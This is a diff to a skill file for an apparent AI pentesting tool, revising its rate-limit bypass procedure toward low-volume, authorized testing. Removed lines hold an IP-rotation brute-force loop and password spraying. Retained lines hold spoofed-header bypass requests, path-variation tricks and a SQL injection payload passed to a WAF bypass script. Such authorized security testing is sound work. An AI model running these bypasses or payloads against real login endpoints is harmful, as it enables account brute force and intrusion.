@@ -1,8 +1,8 @@
 ---
 name: attack-rate-limit-bypass
-description: "Rate limit bypass testing — XFF rotation, case variation, method switching, header manipulation"
+description: "Assess rate-limit enforcement using low-volume tests, controlled identities, and bounded request variants"
 category: "web-application"
-version: "1.0"
+version: "1.1.0"
 author: "cyberstrike-official"
 tags:
   - rate-limit
@@ -33,12 +33,12 @@ Bypass rate limiting mechanisms to enable brute-force attacks, credential stuffi
 ### Phase 1: Automated Bypass Testing
 
 ```bash
-# Full bypass test suite (5 techniques)
-attack_script rate_limit_bypass "https://TARGET/api/login" \
+# Use only an account you control and the program-approved test endpoint; start with three requests
+attack_script rate_limit_bypass "https://TARGET/api/test-login" \
   --method POST \
   -H "Content-Type:application/json" \
-  -d '{"email":"test@test.com","password":"test"}' \
-  --count 20 \
+  -d '{"email":"YOUR_TEST_ACCOUNT@example.invalid","password":"INVALID_TEST_VALUE"}' \
+  --count 3 \
   --json-output
 ```
 
@@ -49,18 +49,17 @@ Tests automatically:
 4. Random query parameter injection
 5. Header-based bypasses
 
-### Phase 2: X-Forwarded-For Rotation
+### Phase 2: Forwarded-IP Header Trust Check
 
 ```bash
-# Rotate source IP via headers
-for i in $(seq 1 50); do
-  IP="$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1))"
-  curl -s -o /dev/null -w "%{http_code} " \
-    -X POST https://TARGET/api/login \
+# Only if header-spoofing tests are allowed; use a test account and a few fixed marker values
+for IP in 192.0.2.10 192.0.2.11 192.0.2.12; do
+  curl --max-time 15 --connect-timeout 5 -s -o /dev/null -w "%{http_code}\\n" \
+    -X POST https://TARGET/api/test-login \
+    -H "Content-Type: application/json" \
     -H "X-Forwarded-For: $IP" \
-    -H "X-Real-IP: $IP" \
-    -H "X-Client-IP: $IP" \
-    -d '{"email":"test@test.com","password":"guess"}'
+    -d '{"email":"YOUR_TEST_ACCOUNT@example.invalid","password":"INVALID_TEST_VALUE"}'
+  sleep 2
 done
 ```
 
@@ -68,46 +67,46 @@ done
 
 ```bash
 # Path case variation
-curl https://TARGET/API/LOGIN
-curl https://TARGET/Api/Login
+curl --max-time 15 --connect-timeout 5 https://TARGET/API/LOGIN
+curl --max-time 15 --connect-timeout 5 https://TARGET/Api/Login
 
 # Trailing slash/dot
-curl https://TARGET/api/login/
-curl https://TARGET/api/login/.
+curl --max-time 15 --connect-timeout 5 https://TARGET/api/login/
+curl --max-time 15 --connect-timeout 5 https://TARGET/api/login/.
 
 # Double slash
-curl https://TARGET//api//login
+curl --max-time 15 --connect-timeout 5 https://TARGET//api//login
 
 # Random query params (new cache key)
-curl "https://TARGET/api/login?_=$(date +%s)"
+curl --max-time 15 --connect-timeout 5 "https://TARGET/api/login?_=$(date +%s)"
 ```
 
 ### Phase 4: Header Bypasses
 
 ```bash
-curl -X POST https://TARGET/api/login \
+curl --max-time 15 --connect-timeout 5 -X POST https://TARGET/api/login \
   -H "X-Forwarded-For: 127.0.0.1"
 
-curl -X POST https://TARGET/api/login \
+curl --max-time 15 --connect-timeout 5 -X POST https://TARGET/api/login \
   -H "X-Forwarded-Host: localhost"
 
-curl -X POST https://TARGET/api/login \
+curl --max-time 15 --connect-timeout 5 -X POST https://TARGET/api/login \
   -H "X-Original-URL: /api/login"
 
-curl -X POST https://TARGET/api/login \
+curl --max-time 15 --connect-timeout 5 -X POST https://TARGET/api/login \
   -H "X-Custom-IP-Authorization: 127.0.0.1"
 ```
 
 ### Phase 5: Account Lockout Bypass
 
 ```bash
-# Distribute across usernames
-for user in user1 user2 user3; do
-  curl -X POST https://TARGET/api/login \
-    -d "{\"email\":\"$user@test.com\",\"password\":\"common_password\"}"
-done
+# Use separate test accounts only if the program explicitly permits account-lockout testing. Do not spray passwords across users.
+curl --max-time 15 --connect-timeout 5 -s -o /dev/null -w "%{http_code}\\n" \
+  -X POST https://TARGET/api/test-login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"YOUR_TEST_ACCOUNT@example.invalid","password":"INVALID_TEST_VALUE"}'
 
-# IP rotation + distributed usernames = bypass
+# Compare the observed response with the documented limit; do not attempt distributed credential stuffing.
 ```
 
 ### Phase 6: WAF Bypass + Rate Limit
@@ -123,8 +122,8 @@ attack_script waf_bypass "admin' OR 1=1--" --test-url "https://TARGET/api/login"
 |---------|----------|
 | Rate limit bypass on login/auth endpoint | High (P2) |
 | Rate limit bypass on password reset | High (P2) |
-| Rate limit bypass on OTP/2FA verification | Critical (P1) |
-| Rate limit bypass on financial operations | Critical (P1) |
+| OTP/2FA rate limit bypass with account takeover demonstrated on a test account | Severity depends on reachable impact, other controls, and program policy |
+| Financial-operation limit bypass with a duplicate or unauthorized test transaction demonstrated | Severity depends on actual financial impact and program policy |
 | Rate limit bypass on non-sensitive endpoint | Low (P4) |
 
 ## Evidence Requirements
@@ -140,6 +139,13 @@ attack_script waf_bypass "admin' OR 1=1--" --test-url "https://TARGET/api/login"
 - `attack_script rate_limit_bypass` — automated 5-technique bypass testing
 - `attack_script waf_bypass` — encoding variants for WAF bypass
 
+## Verification and Safe-Testing Gate
+
+- Confirm the program explicitly permits rate-limit testing. Use a test account and a low request count; do not run distributed brute force, credential stuffing, or high-volume denial-of-service tests.
+- Establish the baseline threshold and reset window before varying one factor such as endpoint, account, token, or client IP. Do not spoof network identity or rotate proxies unless explicitly authorized.
+- Verify the limit is actually bypassed by observing a protected action succeeding beyond the documented/expected threshold, not merely a different status code or error message.
+- Stop on account lockout, service degradation, CAPTCHA escalation, or unexpected alerts. Avoid triggering real emails, SMS, purchases, or password-reset messages repeatedly.
+- Document the exact request sequence, count, interval, identity used, expected limit, observed behavior, and the practical security impact.
 ## References
 
 - [OWASP: Rate Limiting](https://owasp.org/www-community/controls/Rate_Limiting)
